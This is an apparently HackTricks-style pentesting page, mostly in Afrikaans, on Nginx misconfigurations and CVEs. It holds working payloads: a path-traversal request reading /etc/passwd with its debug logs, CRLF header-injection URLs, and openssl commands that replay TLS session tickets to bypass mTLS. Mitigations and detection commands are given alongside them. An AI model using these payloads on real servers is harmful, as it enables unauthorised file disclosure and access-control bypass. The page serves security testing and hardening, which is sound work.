# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Ontbrekende root-ligging <a href="#missing-root-location" id="missing-root-location"></a>

Wanneer jy die Nginx-bediener konfigureer, speel die **root directive** 'n kritieke rol deur die basismap te definieer waarvan lêers bedien word. Oorweeg die volgende voorbeeld:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In hierdie konfigurasie is `/etc/nginx` aangewys as die root-direktorie. Hierdie opstelling laat toegang tot lêers binne die gespesifiseerde root-direktorie toe, soos `/hello.txt`. Dit is egter belangrik om daarop te let dat slegs 'n spesifieke location (`/hello.txt`) gedefinieer is. Daar is geen konfigurasie vir die wortel-locatie (`location / {...}`) nie. Hierdie weglating beteken dat die root-direktief wêreldwyd van toepassing is, wat versoeke na die root-pad `/` in staat stel om lêers onder `/etc/nginx` te bereik.

Daar ontstaan 'n kritieke veiligheidsrisiko deur hierdie konfigurasie. 'n Eenvoudige `GET`-versoek, soos `GET /nginx.conf`, kan sensitiewe inligting blootlê deur die Nginx-konfigurasielêer by `/etc/nginx/nginx.conf` te bedien. Om die root na 'n minder sensitiewe gids, soos `/etc`, te stel kan hierdie risiko verminder, maar dit kan steeds onbeoogde toegang tot ander kritieke lêers moontlik maak, insluitend ander konfigurasielêers, access logs, en selfs geënkripteerde credentials wat vir HTTP basic authentication gebruik word.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In die konfigurasielêers van Nginx is 'n noukeurige ondersoek van die "location" direktiewe nodig. 'n Kwetsbaarheid bekend as Local File Inclusion (LFI) kan per ongeluk ingestel word deur 'n konfigurasie wat soos volg lyk:
```
location /imgs {
alias /path/images/;
}
```
Hierdie konfigurasie is vatbaar vir LFI attacks omdat die server requests soos `/imgs../flag.txt` interpreteer as 'n poging om toegang te kry tot lêers buite die beoogde gids, wat effektief oplos na `/path/images/../flag.txt`. Hierdie fout laat attackers toe om lêers van die server se filesystem te retrieve wat nie via die web toeganglik behoort te wees nie.

Om hierdie vulnerability te mitigate, moet die konfigurasie aangepas word om:
```
location /imgs/ {
alias /path/images/;
}
```
Meer inligting: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix-toetse:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Onveilige padbeperking <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Kyk na die volgende bladsy om te leer hoe om direktiewe soos die volgende te omseil:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Onveilige veranderlike gebruik / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Kwetsbare veranderlikes `$uri` en `$document_ur`i en dit kan reggestel word deur hulle te vervang met `$request_uri`.
>
> 'n regex kan ook kwesbaar wees soos:
>
> `location ~ /docs/([^/])? { … $1 … }` - Kwesbaar
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Nie kwesbaar nie (kontroleer spasies)
>
> `location ~ /docs/(.*)? { … $1 … }` - Nie kwesbaar nie

Hieronder word 'n kwesbaarheid in die Nginx-konfigurasie gedemonstreer:
```
location / {
return 302 https://example.com$uri;
}
```
Die karakters \r (Carriage Return) en \n (Line Feed) dui nuwe reël-karakters in HTTP requests aan, en hul URL-gekodeerde vorms word voorgestel as `%0d%0a`. Die insluiting van hierdie karakters in 'n request (bv., `http://localhost/%0d%0aDetectify:%20clrf`) na 'n verkeerd-gekonfigureerde bediener veroorsaak dat die bediener 'n nuwe header met die naam `Detectify` uitstuur. Dit gebeur omdat die $uri veranderlike die URL-gekodeerde nuwe reël-karakters decodeer, wat lei tot 'n onverwagte header in die response:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Lees meer oor die risiko's van CRLF injection en response splitting by [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Hierdie tegniek word ook [**verklaar in hierdie praatjie**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) met 'n paar kwesbare voorbeelde en opsporingsmeganismes. Byvoorbeeld, om hierdie wankonfigurasie vanuit 'n blackbox-perspektief op te spoor, kan jy die volgende versoeke gebruik:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

As dit kwesbaar is, sal die eerste terugkeer aangesien "X" enige HTTP-metode is en die tweede sal 'n fout teruggee aangesien H nie 'n geldige metode is nie. Dus sal die bediener iets soos ontvang: `GET / H HTTP/1.1` en dit sal die fout aktiveer.

Ander opsporingsvoorbeelde sou wees:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Sommige kwesbare konfigurasies wat in daardie praatjie getoon is, was:

- Let op hoe **`$uri`** presies soos dit is in die finale URL ingestel is
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Let op hoe **`$uri`** weer in die URL voorkom (hierdie keer binne 'n parameter)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Nou in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Enige veranderlike

Daar is ontdek dat **user-supplied data** onder sekere omstandighede as 'n **Nginx variable** behandel kan word. Die oorsaak van hierdie gedrag bly ietwat onduidelik, maar dit is nie skaars of maklik om te verifieer nie. Hierdie anomalie is uitgelig in 'n sekuriteitsverslag op HackerOne, wat besigtig kan word [here](https://hackerone.com/reports/370094). Verdere ondersoek na die foutboodskap het gelei tot die identifisering van die voorkoms daarvan binne die [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), wat Server Side Includes (SSI) as die kernoorsaak aandui.

Om **hierdie wankonfigurasie te ontdek**, kan die volgende opdrag uitgevoer word, wat behels dat 'n Referer header gestel word om vir veranderlike-uitset te toets:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Skanderings vir hierdie wanconfigurasie oor stelsels het verskeie gevalle aan die lig gebring waar Nginx-variabeles deur 'n gebruiker uitgegee kon word. 'n Afname in die aantal kwesbare gevalle dui egter daarop dat pogings om hierdie probleem te patseer redelik suksesvol was.

### Gebruik van try_files met $URI$ARGS-variabeles

Die volgende Nginx-wanconfigurasie kan tot 'n LFI-kwesbaarheid lei:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
In ons konfigurasie het ons die direktief `try_files` wat gebruik word om die bestaan van lêers in 'n gespesifiseerde volgorde te kontroleer. Nginx sal die eerste een bedien wat dit vind. Die basiese sintaksis van die `try_files` direktief is soos volg:
```
try_files file1 file2 ... fileN fallback;
```
Nginx sal die bestaan van elke lêer in die gespesifiseerde volgorde nagaan. As ’n lêer bestaan, sal dit onmiddellik bedien word. As geen van die gespesifiseerde lêers bestaan nie, sal die versoek aan die fallback-opsie deurgegee word, wat ’n ander URI of ’n spesifieke foutbladsy kan wees.

Maar wanneer die `$uri$args`-veranderlikes in hierdie direktief gebruik word, sal Nginx probeer om te kyk vir ’n lêer wat ooreenstem met die versoek-URI gekombineer met enige query string-argumente. Daarom kan ons hierdie konfigurasie uitbuit:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Met die volgende payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Met ons payload sal ons uit die wortelgids ontsnap (gespesifiseer in die Nginx-konfigurasie) en die `/etc/passwd` lêer laai. In debug-logs kan ons sien hoe Nginx die lêers probeer:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC teen Nginx met die konfigurasie soos hierbo genoem:
![Example burp request](../../images/nginx_try_files.png)

## Lees van rou backend-respons

Nginx bied 'n funksie via `proxy_pass` wat die onderskepping van foute en HTTP headers wat deur die backend geproduseer word, toelaat, met die doel om interne foutboodskappe en headers te verberg. Dit word bereik deurdat Nginx pasgemaakte foutbladsye bedien as reaksie op backend-foute. Probleme ontstaan egter wanneer Nginx 'n ongeldige HTTP-versoek teëkom. So 'n versoek word na die backend soos ontvang doorgestuur, en die backend se rou respons word dan direk na die kliënt gestuur sonder Nginx se ingryping.

Oorweeg 'n voorbeeldscenario wat 'n uWSGI-toepassing betrek:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Om dit te hanteer, word spesifieke direktiewe in die Nginx-konfigurasie gebruik:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Hierdie direktief stel Nginx in staat om 'n pasgemaakte antwoord te lewer vir backend-antwoorde met 'n statuskode groter as 300. Dit verseker dat, vir ons voorbeeld uWSGI-toepassing, 'n `500 Error`-antwoord deur Nginx onderskep en hanteer word.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Soos die naam aandui, verberg hierdie direktief gespesifiseerde HTTP-headers vir die kliënt, wat privaatheid en sekuriteit verbeter.

Wanneer 'n geldige `GET`-versoek gemaak word, verwerk Nginx dit normaalweg en stuur 'n standaard foutantwoord sonder om enige geheime headers te openbaar. Maar 'n ongeldig HTTP-versoek omseil hierdie meganisme, wat lei tot die blootstelling van rou backend-antwoorde, insluitend geheime headers en foutboodskappe.

## merge_slashes gestel op off

Standaard is Nginx se **`merge_slashes` directive** gestel op **`on`**, wat meerdere voorwaartse skuinsstreepies in 'n URL saamdruk tot 'n enkele skuinsstreep. Hierdie funksie stroomlyn URL-verwerking, maar kan per ongeluk kwesbaarhede in toepassings agter Nginx wegsteek, veral daardie geneig tot local file inclusion (LFI)-aanvalle. Sekuriteitskundiges **Danny Robinson and Rotem Bar** het die potensiële risiko's verbonde aan hierdie standaardgedrag beklemtoon, veral wanneer Nginx as 'n reverse-proxy optree.

Om sulke risiko's te beperk, word dit aanbeveel om die `merge_slashes`-direktief af te skakel vir toepassings wat vatbaar is vir hierdie kwesbaarhede. Dit verseker dat Nginx versoeke aan die toepassing deurstuur sonder om die URL-struktuur te verander, en sodoende nie onderliggende sekuriteitsprobleme verberg nie.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response-koppe**

Soos getoon in [**this writeup**](https://mizu.re/post/cors-playground), is daar sekere headers wat, indien teenwoordig in die antwoord van die webbediener, die gedrag van die Nginx-proxy sal verander. You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Indicate Nginx to internally redirect a request to a specified location.
- `X-Accel-Buffering`: Controls whether Nginx should buffer the response or not.
- `X-Accel-Charset`: Sets the character set for the response when using X-Accel-Redirect.
- `X-Accel-Expires`: Sets the expiration time for the response when using X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limits the rate of transfer for responses when using X-Accel-Redirect.

Byvoorbeeld, die header **`X-Accel-Redirect`** sal 'n interne **redirect** in die nginx veroorsaak. Dus, 'n nginx-konfigurasie met iets soos **`root /`** en 'n antwoord van die webbediener met **`X-Accel-Redirect: .env`** sal nginx laat die inhoud van **`/.env`** (Path Traversal) stuur.

### Standaardwaarde in map-direktief

In die **Nginx configuration**, speel die `map`-direktief dikwels 'n rol in **authorization control**. 'n Algemene fout is om nie 'n **default** waarde te spesifiseer nie, wat tot ongemagtigde toegang kan lei. For instance:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Sonder 'n `default` kan 'n **kwaadwillige gebruiker** die sekuriteit omseil deur toegang te verkry tot 'n **onbepaalde URI** binne `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) raad aan om 'n **standaardwaarde** in te stel om sulke probleme te vermy.

### **DNS Spoofing Vulnerability**

DNS spoofing teen Nginx is moontlik onder sekere omstandighede. As 'n aanvaller die **DNS server** wat deur Nginx gebruik word ken en sy DNS-navrae kan onderskep, kan hulle DNS-rekords spoof. Hierdie metode is egter ondoeltreffend as Nginx gekonfigureer is om **localhost (127.0.0.1)** vir DNS-oplossing te gebruik. Nginx laat toe om 'n DNS-server soos volg te spesifiseer:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` and `internal` Direktiewe**

Die **`proxy_pass`** direktief word gebruik om versoeke na ander bedieners te herlei, hetsy intern of ekstern. Die **`internal`** direktief verseker dat sekere locaties slegs binne Nginx toeganklik is. Al is hierdie direktiewe op sigself nie kwesbaarhede nie, vereis hul konfigurasie noukeurige ondersoek om sekuriteitsgebreke te voorkom.

## proxy_set_header Upgrade & Connection

As die nginx-bediener gekonfigureer is om die Upgrade- en Connection-headere deur te gee, kan 'n [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) uitgevoer word om toegang tot protected/internal endpoints te kry.

> [!CAUTION]
> Hierdie kwesbaarheid sou 'n aanvaller toelaat om 'n direkte verbinding met die `proxy_pass` endpoint tot stand te bring (`http://backend:9999` in hierdie geval) waarvan die inhoud nie deur nginx nagegaan gaan word nie.

Voorbeeld van kwesbare konfigurasie om `/flag` te steel van [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Let daarop dat selfs as die `proxy_pass` na 'n spesifieke **pad** soos `http://backend:9999/socket.io` verwys, sal die konneksie met `http://backend:9999` gevestig word, sodat jy **enige ander pad binne daardie interne endpoint kan kontak. Dit maak dus nie saak of 'n pad in die URL van proxy_pass gespesifiseer is nie.**

## HTTP/3 QUIC module remote DoS & leak (2024)

In 2024 het Nginx CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 en CVE-2024-35200 bekendgemaak, wat toon dat 'n **enkele kwaadwillige QUIC-sessie** worker processes kan laat crash of memory kan leak wanneer die eksperimentele `ngx_http_v3_module` ingesluit is en 'n `listen ... quic` socket blootgestel word. Geaffekteerde builds is 1.25.0–1.25.5 en 1.26.0, terwyl 1.27.0/1.26.1 die fixes bevat; die memory disclosure (CVE-2024-34161) vereis verder MTUs groter as 4096 bytes om sensitiewe data te openbaar (besonderhede in die 2024 nginx advisory hieronder).

**Recon & exploitation hints**

- HTTP/3 is opt-in, dus scan vir `Alt-Svc: h3=":443"` responses of brute-force UDP/443 QUIC handshakes; sodra bevestig, fuzz die handshake en STREAM frames met custom `quiche-client`/`nghttp3` payloads om worker crashes te veroorsaak en log leakage af te dwing.
- Vinnig fingerprint die teiken se ondersteuning met:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Omseiling van TLS-sessiehervatting by kliëntsertifikaat-verifikasie (CVE-2025-23419)

'n Februarie 2025-advies het bekend gemaak dat nginx 1.11.4–1.27.3, gebou met OpenSSL, toelaat om **hergebruik van 'n TLS 1.3-sessie** van een naamgebaseerde virtuele host binne 'n ander te gebruik, sodat 'n kliënt wat met 'n sertifikaatvrye host onderhandel het die ticket/PSK kan herspeel om in 'n vhost te spring wat beskerm word met `ssl_verify_client on;` en mTLS heeltemal te omseil. Die fout tree op wanneer verskeie virtuele hosts dieselfde TLS 1.3-sessie-kas en tickets deel (sien die nginx-advies van 2025 hieronder).

**Speelboek vir aanvallers**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
As die teiken kwesbaar is, voltooi die tweede handshake sonder om 'n client certificate voor te lê, wat beskermde plekke openbaar.

**What to audit**

- Gemengde `server_name` blokke wat `ssl_session_cache shared:SSL` deel plus `ssl_session_tickets on;`.
- Admin/API blokke wat mTLS verwag maar gedeelde session cache/ticket-instellings van publieke hosts erf.
- Automatisering wat TLS 1.3 session resumption wêreldwyd aktiveer (e.g., Ansible roles) sonder om vhost isolasie te oorweeg.

## HTTP/2 Rapid Reset weerbaarheid (CVE-2023-44487 gedrag)

Die HTTP/2 Rapid Reset attack (CVE-2023-44487) beïnvloed nog steeds nginx wanneer operators `keepalive_requests` of `http2_max_concurrent_streams` bo die verstekwaardes opskuif: 'n aanvaller open een HTTP/2-verbinding, oorlaai dit met duisende streams, en stuur dan onmiddellik `RST_STREAM`-frames sodat die concurrency ceiling nooit bereik word nie terwyl die CPU aanhou brand op die afbreeklogika. Nginx verstekwaardes (128 concurrent streams, 1000 keepalive requests) hou die blast radius klein; om daardie perke "substantieel hoër" te stel maak dit eenvoudig om werkers te verhonger selfs vanaf 'n enkele kliënt (sien die F5 write-up hieronder).

**Opsporingwenke**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Bedieners wat abnormaal hoë waardes vir daardie directives openbaar, is ideale teikens: een HTTP/2-klient kan deur stroomskep en onmiddellike `RST_STREAM`-rame herhaal om die CPU vas te pen sonder om die konkurrensieplafon te tref.

## Probeer dit self

Detectify het 'n GitHub-repository geskep waar jy Docker kan gebruik om jou eie kwesbare Nginx-toetsbediener op te stel met sommige van die miskonfigurasies wat in hierdie artikel bespreek word en self te probeer opspoor!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statiese analise-instrumente

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (an updated fork of GIXY) is 'n hulpmiddel om Nginx-konfigurasies te ontleed, met die doel om kwesbaarhede, onveilige direktiewe en riskante miskonfigurasies te identifiseer. Dit vind ook miskonfigurasies wat prestasie beïnvloed, en herken gemiste hardening-geleenthede, wat geautomatiseerde foutopsporing moontlik maak.
- [gixy-ng](https://github.com/dvershinin/gixy) (the actively maintained fork of GIXY) is 'n hulpmiddel om Nginx-konfigurasies te ontleed, met die doel om kwesbaarhede, onveilige direktiewe en riskante miskonfigurasies te identifiseer. Dit vind ook miskonfigurasies wat prestasie beïnvloed, en herken gemiste hardening-geleenthede, wat geautomatiseerde foutopsporing moontlik maak.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner is 'n eenvoudige hulpmiddel om na algemene Nginx-miskonfigurasies en kwesbaarhede te soek.

## Verwysings

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
